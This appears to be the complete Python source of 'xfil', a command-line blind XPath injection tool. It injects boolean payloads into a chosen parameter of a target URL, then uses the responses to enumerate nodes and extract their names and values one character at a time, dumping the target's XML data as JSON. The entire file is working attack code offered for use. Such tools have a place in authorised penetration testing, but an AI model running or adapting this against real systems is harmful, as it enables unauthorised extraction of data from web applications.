import argparse
import requests
import time
import warnings
import json
from typing import Optional, Union, Dict, Any
from urllib.parse import urljoin, parse_qs, urlencode

attribution_notice = '''
██╗  ██╗███████╗██╗██╗     
╚██╗██╔╝██╔════╝██║██║     
 ╚███╔╝ █████╗  ██║██║     
 ██╔██╗ ██╔══╝  ██║██║     
██╔╝ ██╗██║     ██║███████╗
╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝

Blind XPath Exfiltration Tool
by @lpha3ch0
'''

class XPathBlindTester:
    def __init__(self, url: str, method: str, param: str,
                 success_text: Optional[str] = None,
                 failure_text: Optional[str] = None,
                 success_code: Optional[int] = None,
                 failure_code: Optional[int] = None,
                 post_data: Optional[Dict] = None,
                 content_type: Optional[str] = None,
                 headers: Optional[Dict] = None):
        self.url = url
        self.method = method.upper()
        self.param = param
        self.success_text = success_text
        self.failure_text = failure_text
        self.success_code = success_code
        self.failure_code = failure_code
        self.post_data = post_data or {}
        self.content_type = content_type
        self.headers = headers or {}
        
        self.char_set = (
            'abcdefghijklmnopqrstuvwxyz'
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            '0123456789'
            '_-@.!#$%&*+=:;/\\()[]{}<>"\','
            ' '
        )

    def prepare_request_data(self, payload: str) -> tuple[Union[Dict, str], Dict]:
        """Prepare request data and headers based on content type."""
        headers = self.headers.copy()
        
        if self.method == "GET":
            return {self.param: payload}, headers
            
        data = self.post_data.copy()
        data[self.param] = payload

        if self.content_type == "application/json":
            headers['Content-Type'] = 'application/json'
            return json.dumps(data), headers
        elif self.content_type == "application/x-www-form-urlencoded":
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            return urlencode(data), headers
        elif self.content_type == "multipart/form-data":
            return data, headers
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            return urlencode(data), headers

    def send_request(self, payload: str) -> Union[requests.Response, None]:
        try:
            data, headers = self.prepare_request_data(payload)
            
            if self.method == "GET":
                response = requests.get(self.url, params=data, headers=headers)
            else:
                if self.content_type == "application/json":
                    response = requests.post(self.url, data=data, headers=headers)
                elif self.content_type == "multipart/form-data":
                    response = requests.post(self.url, files=data, headers=headers)
                else:
                    response = requests.post(self.url, data=data, headers=headers)
                
            return response
        except requests.RequestException as e:
            print(f"Error sending request: {e}")
            return None

    def is_successful(self, response: requests.Response) -> bool:
        if response is None:
            return False
            
        if self.success_code and response.status_code == self.success_code:
            return True
        if self.failure_code and response.status_code == self.failure_code:
            return False
            
        if self.success_text and self.success_text in response.text:
            return True
        if self.failure_text and self.failure_text in response.text:
            return False
            
        return response.status_code == 200

    def test_condition(self, xpath_condition: str) -> bool:
        payload = f"invalid' or {xpath_condition} and '1'='1"
        response = self.send_request(payload)
        return self.is_successful(response)

    def get_string_length(self, xpath_expr: str) -> Optional[int]:
        print(f"Finding length for: {xpath_expr}")
        for i in range(1, 101):
            if self.test_condition(f"string-length({xpath_expr})={i}"):
                return i
        return None

    def extract_string(self, xpath_expr: str, length: int) -> Optional[str]:
        result = ""
        print(f"Extracting string of length {length} for: {xpath_expr}")
        
        for pos in range(1, length + 1):
            found = False
            for char in self.char_set:
                print(f"\rTrying position {pos}/{length}: {char}", end="", flush=True)
                
                # Properly escape special characters for XPath
                escaped_char = char
                if char in "'\"":  # Handle quotes
                    escaped_char = f'concat("{char}", "")' if char == '"' else f"concat('{char}', '')"
                elif char in '\\':  # Handle backslash
                    escaped_char = f"'{char}{char}'"  # Double the backslash
                else:
                    escaped_char = f"'{char}'"
                
                if self.test_condition(f"substring({xpath_expr},{pos},1)={escaped_char}"):
                    result += char
                    found = True
                    print(f"\rPosition {pos}/{length}: Found '{char}'")
                    break
                    
            if not found:
                print(f"\nFailed to find character at position {pos}")
                return None
                
        print(f"Extracted: {result}\n")
        return result

    def get_child_count(self, xpath_expr: str) -> Optional[int]:
        print(f"Finding child count for: {xpath_expr}")
        for i in range(101):
            if self.test_condition(f"count({xpath_expr}/*)={i}"):
                return i
        return None

    def get_node_count(self, xpath_expr: str) -> Optional[int]:
        print(f"Finding node count for: {xpath_expr}")
        for i in range(1, 101):
            if self.test_condition(f"count({xpath_expr})={i}"):
                return i
        return None

    def extract_node_value(self, xpath_expr: str) -> Optional[str]:
        if not self.test_condition(f"string-length({xpath_expr}/text()) > 0"):
            return None
            
        length = self.get_string_length(f"string({xpath_expr})")
        if not length:
            return None
            
        return self.extract_string(f"string({xpath_expr})", length)

    def extract_data(self, current_path: str = "/*") -> Dict[str, Any]:
        result = {}
        
        node_count = self.get_node_count(current_path)
        if not node_count:
            return result
            
        for i in range(1, node_count + 1):
            current_node = f"{current_path}[{i}]"
            
            name_length = self.get_string_length(f"name({current_node})")
            if not name_length:
                continue
                
            node_name = self.extract_string(f"name({current_node})", name_length)
            if not node_name:
                continue
                
            child_count = self.get_child_count(current_node)
            
            if child_count == 0:
                node_value = self.extract_node_value(current_node)
                if node_value is not None:
                    if node_name in result:
                        if not isinstance(result[node_name], list):
                            result[node_name] = [result[node_name]]
                        result[node_name].append(node_value)
                    else:
                        result[node_name] = node_value
            else:
                child_data = self.extract_data(f"{current_node}/*")
                if node_name in result:
                    if not isinstance(result[node_name], list):
                        result[node_name] = [result[node_name]]
                    result[node_name].append(child_data)
                else:
                    result[node_name] = child_data
                
        return result

def parse_post_data(data_str: str) -> Dict:
    """Parse POST data from string format into dictionary."""
    if not data_str:
        return {}
        
    try:
        return json.loads(data_str)
    except json.JSONDecodeError:
        try:
            parsed = parse_qs(data_str)
            return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
        except Exception as e:
            print(f"Error parsing POST data: {e}")
            return {}

def parse_headers(headers_str: str) -> Dict:
    """Parse headers from string format into dictionary."""
    if not headers_str:
        return {}
        
    try:
        return json.loads(headers_str)
    except json.JSONDecodeError:
        headers = {}
        try:
            pairs = headers_str.replace('\n', ';').split(';')
            for pair in pairs:
                if ':' in pair:
                    key, value = pair.split(':', 1)
                    headers[key.strip()] = value.strip()
            return headers
        except Exception as e:
            print(f"Error parsing headers: {e}")
            return {}

class CustomFormatter(argparse.HelpFormatter):
    def _get_help_string(self, action):
        return action.help

class CustomArgumentParser(argparse.ArgumentParser):
    def format_help(self):
        return attribution_notice + "\n" + super().format_help()

def main():
    parser = CustomArgumentParser(description='xfil : Blind XPath exfiltration tool')
    parser.add_argument('-q', '--quiet', action='store_true', help='Suppress banner')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--method', required=True, choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('--param', required=True, help='Vulnerable parameter name')
    parser.add_argument('--success-text', help='Text indicating successful injection')
    parser.add_argument('--failure-text', help='Text indicating failed injection')
    parser.add_argument('--success-code', type=int, help='HTTP status code indicating success')
    parser.add_argument('--failure-code', type=int, help='HTTP status code indicating failure')
    parser.add_argument('--post-data', help='Additional POST data in format "key1=value1&key2=value2" or JSON string')
    parser.add_argument('--content-type', 
                       choices=['application/json', 'application/x-www-form-urlencoded', 'multipart/form-data'],
                       help='Content-Type header for POST requests')
    parser.add_argument('--headers',
                       help='Additional headers in JSON format or "Key: Value" pairs separated by semicolons or newlines')
    
    args = parser.parse_args()
    
    if not args.quiet:
        print(attribution_notice)
    
    post_data = parse_post_data(args.post_data) if args.post_data else {}
    headers = parse_headers(args.headers) if args.headers else {}
    
    tester = XPathBlindTester(
        url=args.url,
        method=args.method,
        param=args.param,
        success_text=args.success_text,
        failure_text=args.failure_text,
        success_code=args.success_code,
        failure_code=args.failure_code,
        post_data=post_data,
        content_type=args.content_type,
        headers=headers
    )
    
    print("Starting full XML data extraction...")
    data = tester.extract_data()
    print("\nExtracted Data:")
    print(json.dumps(data, indent=2))

if __name__ == "__main__":
    main()